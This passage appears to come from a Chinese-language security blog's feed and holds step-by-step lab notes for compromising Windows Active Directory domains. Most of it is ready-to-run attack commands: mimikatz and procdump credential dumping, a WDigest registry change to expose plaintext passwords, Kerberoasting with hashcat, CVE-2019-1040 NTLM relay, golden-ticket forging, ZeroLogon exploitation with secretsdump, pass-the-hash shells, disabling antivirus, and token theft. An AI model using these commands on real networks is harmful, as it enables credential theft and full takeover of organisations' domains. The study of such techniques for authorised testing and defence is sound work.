src="/2022/04/05/day43/image-20220413124320128.png" alt="image-20220413124320128"></p><p>使用隧道，默认socks5，也可选择socks4a</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/server/socks_proxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220416094907593.png" alt="image-20220416094907593"></p><p>直接 run就行</p><p>之后我们使用proxychains4来代理一些工具走socks5这个隧道</p><p>编辑配置文件</p><pre class="line-numbers language-none"><code class="language-none">sudo vi /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将socks4改为socks5；将127.0.0.1改为本机kali ip；修改端口</p><p><img src="/2022/04/05/day43/image-20220416101438528.png" alt="image-20220416101438528"></p><p>比如我们使用ptoxychains4代理nmap</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 nmap 10.10.10.138 -sT -A -p 445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-pn 不检测主机存活</p><p>禁止smb协议ping到目标主机，假如没有返回smb包，nmap默认主机不存在</p></blockquote><p><img src="/2022/04/05/day43/image-20220416101527009.png" alt="image-20220416101527009"></p><p>设置代理，让msf直接访问目标</p><pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4/5:ip:port #让msf所有模块的流量都通过此代理走。(setg全局设置) setg Proxies socks5:192.168.0.180:1080 set ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置代理之后可直接访问目标主机</p><p><img src="/2022/04/05/day43/image-20220416103059359.png" alt="image-20220416103059359"></p><h2 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h2><p>常用信息搜集模块</p><pre class="line-numbers language-none"><code class="language-none">auxiliary/scanner/discovery/arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口 auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描，默认扫描1-10000端口 auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机 auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机 auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口 auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口 auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口 auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口 auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口 auxiliary/scanner/http/title #探测内网http服务的标题 auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 use auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口use auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口 auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口 auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口 auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口 auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口 auxiliary/scanner/netbios/nbname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>收集域信息</p><pre class="line-numbers language-none"><code class="language-none">run post/windows/gather/enum_logged_on_users #查看登录过的用户信息 run post/windows/gather/enum_ad_groups #查看组信息 run post/windows/gather/enum_domain #定位域控 run post/windows/gather/enum_ad_computers #域内所有机器 use post/windows/gather/enum_patches #发现缺失的补丁 use post/multi/recon/local_exploit_suggester #快速识别可能被利用的漏洞 run post/windows/manage/migrate #自动进程迁移 run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上 run post/windows/manage/killav #关闭杀毒软件 run post/windows/manage/enable_rdp #开启远程桌面服务 run post/windows/manage/autoroute #查看路由信息 run post/windows/gather/enum_logged_on_users #列举当前登录的用户 run post/windows/gather/enum_applications #列举应用程序 run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码 run post/windows/gather/smart_hashdump #dump出所有用户的hash run post/windows/gather/enum_domain_tokens #寻找域token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h2><p>检测用户账号</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/gather/kerberos_enumusers   #Kerberos用户名枚举–用户名字典<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220416111322619.png" alt="image-20220416111322619"></p><p>使用密码尝试登录</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/smb/smb_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220416111927482.png" alt="image-20220416111927482"></p><p>猜解密码时，应当考虑账户锁定策略，最好一次猜解一个密码，限制自己猜解的次数为2次或者4次。</p><h2 id="令牌"><a href="#令牌" class="headerlink" title="令牌"></a>令牌</h2><p>令牌登录</p><pre class="line-numbers language-none"><code class="language-none">load incognito #加载incognito list_tokens -u #列出当前系统可用的token impersonate_token 'NT AUTHORITYSYSTEM' #假冒SYSTEM token orimpersonate_token NT AUTHORITY\SYSTEM #参数不加单引号需要对特殊字符进行转义 rev2self #返回原始token <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>令牌窃取</p><pre class="line-numbers language-none"><code class="language-none">ps #查看系统进程信息 steal_token &lt;pid值&gt; #从指定进程中窃取token drop_token #删除窃取的token <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内网之域普通用户到域控"><a href="#内网之域普通用户到域控" class="headerlink" title="内网之域普通用户到域控"></a>内网之域普通用户到域控</h2><p>在windows2008里我们可使用MS 14-086 exp模块进行提权</p><pre class="line-numbers language-none"><code class="language-none">admin/kerberos/ms14_068_kerberos_checksum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到一个域普通用户，在merterpreter中进入shell，whoami /all 查询user sid</p><p>之后进入模块，填写参数</p><p><img src="/2022/04/05/day43/image-20220417122704759.png" alt="image-20220417122704759"></p><p>如果域名无法解析，将nameserver 填写域控ip</p><pre class="line-numbers language-none"><code class="language-none">sudo vi /etc/resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后run即可，生成bin文件</p><p><img src="/2022/04/05/day43/image-20220417123034980.png" alt="image-20220417123034980"></p><p>在merterpreter中将bin文件上传至域普通用户</p><p><img src="/2022/04/05/day43/image-20220417124417394.png" alt="image-20220417124417394"></p><p>在与普通用户里使用mimikatz将bin文件导入票据，即可访问域控</p><p><img src="/2022/04/05/day43/image-20220417125421667.png" alt="image-20220417125421667"></p><p>刚开始拒绝访问，我们将bin文件导入进程即可访问域控</p><p>可将域普通用户的mimikatz复制到域控下的c盘</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Users\test\Desktop\mimikatz_trunk\x64\mimikatz.exe \\08server-dc.moonsec.fbi\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220417130144141.png" alt="image-20220417130144141"></p><p>也可以使用psexec进行登录</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\test\Desktop\PsExec64.exe \\08server-dc.moonsec.fbi -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220417125749288.png" alt="image-20220417125749288"></p><p>使用刚才复制的mimikatz导出域控的hash</p><p><img src="/2022/04/05/day43/image-20220417130251042.png" alt="image-20220417130251042"></p><p>因为原本就是system权限，所以不需要使用privilege::debug进行提权</p><p>直接导出hash</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220417130529443.png" alt="image-20220417130529443"></p><p>拿到ntlm hash可以做票据</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取域控权限</title>
      <link href="/2022/03/24/day42/"/>
      <url>/2022/03/24/day42/</url>
      
        <content type="html"><![CDATA[<h1 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h1><span id="more"></span><h2 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a>高权限读取本地密码</h2><p>当域管理员登录域成员主机时，会把明文密码保存在本地的lsass.exe进程</p><p>我们使用域控通过3389远程登录域成员机器，输入域控密码</p><p><img src="/2022/03/24/day42/image-20220324182534909.png" alt="image-20220324182534909"></p><h3 id="通过mimikatz读取"><a href="#通过mimikatz读取" class="headerlink" title="通过mimikatz读取"></a>通过mimikatz读取</h3><p>在域普通股用户使用mimikatz</p><p><strong>进入debug模式。读取，退出，导出到log.txt</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt;log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324182807768.png" alt="image-20220324182807768"></p><p>可看到拿到了管理员的hash，我们可以在cmd5进行解密</p><p><img src="/2022/03/24/day42/image-20220324183024838.png" alt="image-20220324183024838"></p><p><strong>通过建立ipc$连接访问域控</strong></p><pre class="line-numbers language-none"><code class="language-none">net use \\10.10.10.137\ipc$ "qweASD123" /user:redteam\administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建立后就可访问域控</p><p><img src="/2022/03/24/day42/image-20220324183347682.png" alt="image-20220324183347682"></p><p>也可再kali中使用wmic脚本通过hash利用</p><pre class="line-numbers language-none"><code class="language-none">执行whoamipython3 wmiexec.py -hashes 00000000000000000000000000000000:42e2656ec24331269f82160ff5962387 administrator@10.10.10.137 "whoami" 打开cmdpython3 wmiexec.py -hashes 00000000000000000000000000000000:42e2656ec24331269f82160ff5962387 administrator@10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324183611585.png" alt="image-20220324183611585"></p><h3 id="procdump-本地mimikatz读取lsass明文"><a href="#procdump-本地mimikatz读取lsass明文" class="headerlink" title="procdump+本地mimikatz读取lsass明文"></a>procdump+本地mimikatz读取lsass明文</h3><p>如果mimikatz被杀软，我们使用此方法</p><p><strong>使用procdump导出lsass.dmp</strong></p><pre class="line-numbers language-none"><code class="language-none">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324184219330.png" alt="image-20220324184219330"></p><p><strong>拿到本地通过mimikatz读取</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324184334435.png" alt="image-20220324184334435"></p><h3 id="通过注册表-锁屏读取"><a href="#通过注册表-锁屏读取" class="headerlink" title="通过注册表+锁屏读取"></a>通过注册表+锁屏读取</h3><p>通过添加注册表，再通过锁屏让管理员重新登录即可获取明文</p><p><strong>添加注册表，设置UseLogonCredential设置为1</strong></p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324184904145.png" alt="image-20220324184904145"></p><p>powershell脚本进行锁屏</p><pre class="line-numbers language-none"><code class="language-none">Function Lock-WorkStation {$signature = @" [DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation(); "@$LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null }Lock-WorkStation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>管理员重新登录</p><p><strong>之后用mimikatz读取，可读取明文</strong></p><pre class="line-numbers language-none"><code class="language-none">mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt;log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324185222886.png" alt="image-20220324185222886"></p><p>可看到拿到了明文，之后可建立ipc$</p><h2 id="SYSVOL组策略获取密码"><a href="#SYSVOL组策略获取密码" class="headerlink" title="SYSVOL组策略获取密码"></a>SYSVOL组策略获取密码</h2><p>在域环境中，有个默认的共享路径</p><pre class="line-numbers language-none"><code class="language-none">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的私钥。</p><p>sysvol是活动那个目录存储文件服务的共享文件夹，里面有登录脚本、组策略等。域内所有用户都可访问此共享文件夹，此文件加下，如果创建了组策略脚本登录，就会有groups.xml文件，此文件中密码经过AES-256加密，我们通过AES的私钥用powershell脚本来破解</p><p><strong>针对SYSYVOL防御：</strong></p><ul><li>打补丁KB2962486 </li><li>删除SYSVOL目录下的groups.xml </li><li>设置共享文件SYSVOL的权限 </li></ul><h2 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h2><p>SPN为服务主体名称，是服务实列(MySQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实例都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，有可能获取到域用户的密码了。如果服务是域管理员注册的，就可拿到域管密码。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>user访问server，向DC发起认证，请求先送达KDS中的AS进行身份认证，认证通过返回一个用user密码的hash进行加密的TGT给user，user拿着TGT访问TGS，认证通过返回一个用对应服务密码的hash进行加密的ST，user拿着ST访问对应服务。在TGS返回ST时，加密算法是RC4_HMAC_MD5，我们可进行穷举口令。</p><p>在域控修改加密方式</p><p><img src="/2022/03/24/day42/image-20220324194240199.png" alt="image-20220324194240199"></p><h3 id="使用setspn查询spn"><a href="#使用setspn查询spn" class="headerlink" title="使用setspn查询spn"></a>使用setspn查询spn</h3><p>windows7和server2008默认自带</p><pre class="line-numbers language-none"><code class="language-none">setspn.exe -q */* setspn.exe -T redteam.club -q */*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324194514435.png" alt="image-20220324194514435"></p><p>CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users</p><p>我们发现了mysql这个服务</p><h3 id="getuserspns-vbs脚本查询spn"><a href="#getuserspns-vbs脚本查询spn" class="headerlink" title="getuserspns.vbs脚本查询spn"></a>getuserspns.vbs脚本查询spn</h3><pre class="line-numbers language-none"><code class="language-none">cscript GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324194841490.png" alt="image-20220324194841490"></p><h3 id="powerview查询spn"><a href="#powerview查询spn" class="headerlink" title="powerview查询spn"></a>powerview查询spn</h3><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView2.ps1 Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324195003499.png" alt="image-20220324195003499"></p><p>这里没查到</p><h3 id="脚本穷举"><a href="#脚本穷举" class="headerlink" title="脚本穷举"></a>脚本穷举</h3><p><strong>请求指定的TGS</strong></p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "mysql/12server4.redteam.club:3306"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324195209739.png" alt="image-20220324195209739"></p><p><strong>mimikatz导出票据</strong></p><pre class="line-numbers language-none"><code class="language-none">kerberos::list /exort<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324195422522.png" alt="image-20220324195422522"></p><p>可看到导出了票据，我们这里用mysql的</p><p><strong>把票据拿到kali，使用tgsrepcrack.py脚本破解</strong></p><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p><pre class="line-numbers language-none"><code class="language-none">python3 tgsrepcrack.py 字典 票据名python3 tgsrepcrack.py passwd.txt 1-40a10000-test@mysql~12server4.redteam.club~3306-REDTEAM.CLUB.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324200341369.png" alt="image-20220324200341369"></p><p>拿到了注册这个服务的用户的密码</p><h3 id="hashcat穷举"><a href="#hashcat穷举" class="headerlink" title="hashcat穷举"></a>hashcat穷举</h3><p>使用 System.IdentityModel.Tokens.KerberosRequestorSecurityToken 请求TGS，在返回结果中提取出TGS</p><p>输出的TGS可选择John the Ripper或Hashcat进行破解。</p><p>导入脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-Kerberoast.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出TGS</p><pre class="line-numbers language-none"><code class="language-none">Invoke-Kerberoast -OutputFormat Hashcat 将hash导出到hash.txtInvoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation &gt;hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324200757233.png" alt="image-20220324200757233"></p><p><strong>使用hashcat对其进行穷举</strong></p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 hash.txt /home/kali/Desktop/kerberoast-master/passwd.txt -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220324202122767.png" alt="image-20220324202122767"></p><p>可看到密码是pass@123，穷举出来了</p><p>在found.txt中看到，密码是12server4的test用户，并非域控，如果此服务是域控注册，我们可通过此方法拿到域控密码</p><p>inface eth0 inet static  </p><p>address 10.10.10.160  </p><p>gateway 10.10.10.2  </p><p>netmask 255.255.255.0</p><h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h2><p>内网NTLM协议大杀器</p><p><strong>创建机器主机账号</strong></p><p>kali下impact-master中的脚本</p><pre class="line-numbers language-none"><code class="language-none">python3 addcomputer.py -method SAMR -dc-ip 10.10.10.142 -computer-name moonsec -computer-pass pass@123 "redteam.club/hack:pass@123" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325202348201.png" alt="image-20220325202348201"></p><p>执行成功后，在域控ad下，创建了机器主机账户</p><p><img src="/2022/03/24/day42/image-20220325202444617.png" alt="image-20220325202444617"></p><p><strong>中继</strong></p><p>执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议</p><pre class="line-numbers language-none"><code class="language-none">python3 ntlmrelayx.py -t ldap://10.10.10.142 -smb2support --remove-mic --delegate-access --escalate-user moonsec\$ -debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325202619496.png" alt="image-20220325202619496"></p><p><strong>设置委派</strong></p><p>域控有两台域控 10.10.10.142 主控 10.10.10.140备份域控 10.10.10.159 是中继机子（kali）</p><pre class="line-numbers language-none"><code class="language-none">python3 printerbug.py redteam.club/hack:pass@123@10.10.10.140 10.10.10.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325203515154.png" alt="image-20220325203515154"></p><p>设置之后中继监听到了数据</p><p><img src="/2022/03/24/day42/image-20220325203554229.png" alt="image-20220325203554229"></p><p><strong>获取服务票据</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 getST.py -dc-ip 10.10.10.142 redteam/moonsec\$:pass@123 -spn cifs/ad2.redteam.club -impersonate administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325203725262.png" alt="image-20220325203725262"></p><p>可看到服务票据被保存下来了</p><p><strong>修改变量值</strong></p><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>导出域控hash</strong></p><pre class="line-numbers language-none"><code class="language-none">导出域控hashpython3 secretsdump.py -k -no-pass ad2.redteam.club -just-dc-user administrator 导出全部hashpython3 secretsdump.py -k -no-pass ad2.redteam.club -just-dc-ntlm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果失败需要设置</p><pre class="line-numbers language-none"><code class="language-none">sudo vi /etc/resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325204227877.png" alt="image-20220325204227877"></p><p>可看到导出了所有的hash</p><p><img src="/2022/03/24/day42/image-20220325204251935.png" alt="image-20220325204251935"></p><p>可用smbexec拿交互式shell</p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py -no-pass -k ad2.redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325204432729.png" alt="image-20220325204432729"></p><p><strong>制作黄金票据拿域控权限</strong></p><p>之前我们在导出的hash里面发现了krbtgt的hash，我们可用此来做黄金票据</p><p><img src="/2022/03/24/day42/image-20220325204841044.png" alt="image-20220325204841044"></p><p>利用mimikatz做黄金票据，以此来拿到域控权限</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "kerberos::golden /admin:system /domain:redteam.club /sid:S-1-5-21-2365300756-2663045586-4193326672 /krbtgt:b6e0fcce3106665064de4917394ccc27 /ticket:ticket.kirbi" exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325205202509.png" alt="image-20220325205202509"></p><p><strong>导入黄金票据</strong></p><p><img src="/2022/03/24/day42/image-20220325205318781.png" alt="image-20220325205318781"></p><p>导入之后我们可以访问到域控</p><p><strong>利用psexec拿到交互式shell</strong></p><p>需要开放445端口</p><pre class="line-numbers language-none"><code class="language-none">PsExec64.exe \\ad1 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325205827254.png" alt="image-20220325205827254"></p><h2 id="CVE-2020-1472-ZeroLogon"><a href="#CVE-2020-1472-ZeroLogon" class="headerlink" title="CVE-2020-1472-ZeroLogon"></a>CVE-2020-1472-ZeroLogon</h2><p>因为Netlogon使用的AES认证算法中的vi向量默认为0，导致可以绕过认证，同时由于其设置域控密码的远程接口也使用了这个函数，导致可以将域控中保存在AD中的管理员password设置为空</p><pre class="line-numbers language-none"><code class="language-none">影响版本：Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用zerologon脚本复现"><a href="#使用zerologon脚本复现" class="headerlink" title="使用zerologon脚本复现"></a>使用zerologon脚本复现</h3><p><strong>检测是否存在漏洞</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 zerologon_tester.py ad01 10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325145309489.png" alt="image-20220325145309489"></p><p><strong>下载利用exp</strong></p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/dirkjanm/CVE-2020-1472<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>置空DC的密码</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 cve-2020-1472-exploit.py ad01 10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325145703834.png" alt="image-20220325145703834"></p><p><strong>获取HASH</strong></p><p>使用impacket-master包中的secretsdum.py获取相关HASH</p><pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py redteam.club/ad01\$@10.10.10.137 -no-pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325145855179.png" alt="image-20220325145855179"></p><p>拿到了域管hash、krbtgthash、刚才指控的机器账号ad01的空hash、域成员的hash</p><p><strong>获取一个shell</strong></p><p>拿到域管hash后，我们可以用wmic获取一个shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:96783bb69c00614e88f7d4688623c83a redteam.club/administrator@10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325150343414.png" alt="image-20220325150343414"></p><p>可以看到是域控下的管理员</p><p><strong>获取原域控机器账号hash</strong></p><p>在shell里执行</p><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.save reg save HKLM\SAM sam.save reg save HKLM\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325150746646.png" alt="image-20220325150746646"></p><p><strong>拿到文件后，获取原hash</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325150842295.png" alt="image-20220325150842295"></p><p><strong>利用脚本还原域控机器账号的原HASH</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 reinstall_original_pw.py ad01 10.10.10.137 53f796dbbfdd48f8001a11dc782a0a348c2d5384a6d546a13439a37ba2a819fbe8e3d9e228a422c296820f5b74b88211e355bae3288e0ed12f9cf9f528b8c28aac64840d9282133b15d0c46f4546ea6190e81728e6abb6974aab815016ae9d135baa7b11691c8348651e92c3033e27b7598065dbaf81146dec8dfbe8af17e7ebb7c3460d5533f70ddf49a5a6265e7a0ac35cb7104f6d3bd45687255837016eaed71c5979654537811826018641455b24b73e4c674e7622489060a9d7415c5b290d984f0a0aabfff9e409a58447cbfc7f517624cd9e38f54b14c096fa5aba864dd203bb41c5e59480740e66a3a659ddf5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325151227135.png" alt="image-20220325151227135"></p><p><strong>再次拿hash可发现hash已经恢复</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 secretsdump.py ad01.redteam.club/administrator@10.10.10.137 -hashes :96783bb69c00614e88f7d4688623c83a <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MS-14-068"><a href="#MS-14-068" class="headerlink" title="MS-14-068"></a>MS-14-068</h2><p>在内网渗透中的金票利用详细写过</p><h2 id="cs获取域管权限"><a href="#cs获取域管权限" class="headerlink" title="cs获取域管权限"></a>cs获取域管权限</h2><p>我们在拿到一个域普通用户的情况下，我们通过cs让他上线</p><p>在同网段下</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>入侵了域管理员所登录的服务器，将进程迁移到域管理员所运行的进程，就可以获得域管理员权限</p><p>上线之后</p><p>进入进程列表</p><p><img src="/2022/03/24/day42/image-20220325174837080.png" alt="image-20220325174837080"></p><p>设置session的 sleep 0</p><p>在进程列票里发现了域管理员进程，我们就可以注入</p><p><img src="/2022/03/24/day42/image-20220325175250229.png" 